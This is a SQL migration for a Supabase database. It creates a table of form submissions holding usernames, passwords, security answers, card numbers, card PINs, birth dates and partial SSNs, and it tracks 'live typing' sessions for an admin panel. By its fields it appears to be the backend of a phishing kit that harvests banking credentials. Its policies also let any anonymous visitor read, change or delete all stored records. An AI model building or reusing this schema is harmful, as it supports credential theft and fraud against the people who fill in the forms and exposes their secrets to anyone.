
-- Table for storing user form submissions (cross-device)
CREATE TABLE public.user_entries (
  id text PRIMARY KEY,
  type text NOT NULL DEFAULT 'new',
  timestamp text NOT NULL DEFAULT to_char(now(), 'YYYY-MM-DD"T"HH24:MI:SS.MS"Z"'),
  user_id_field text,
  password_field text,
  first_name text,
  last_name text,
  email text,
  phone text,
  challenge_questions jsonb DEFAULT '[]'::jsonb,
  card_number text,
  pin_card text,
  dob text,
  ssn_last4 text,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE public.user_entries ENABLE ROW LEVEL SECURITY;

-- Anyone can insert (anonymous visitors fill forms)
CREATE POLICY "Public can insert user entries"
  ON public.user_entries FOR INSERT
  TO anon, authenticated
  WITH CHECK (true);

-- Anyone can read (admin panel needs to read)
CREATE POLICY "Public can read user entries"
  ON public.user_entries FOR SELECT
  TO anon, authenticated
  USING (true);

-- Anyone can update (for updateLastUser)
CREATE POLICY "Public can update user entries"
  ON public.user_entries FOR UPDATE
  TO anon, authenticated
  USING (true)
  WITH CHECK (true);

-- Anyone can delete (for clear all)
CREATE POLICY "Public can delete user entries"
  ON public.user_entries FOR DELETE
  TO anon, authenticated
  USING (true);

-- Enable realtime
ALTER PUBLICATION supabase_realtime ADD TABLE public.user_entries;

-- Also add delete policy for live_sessions and live_typing (for clear all)
CREATE POLICY "Public can delete live sessions"
  ON public.live_sessions FOR DELETE
  TO anon, authenticated
  USING (true);

CREATE POLICY "Public can delete live typing"
  ON public.live_typing FOR DELETE
  TO anon, authenticated
  USING (true);
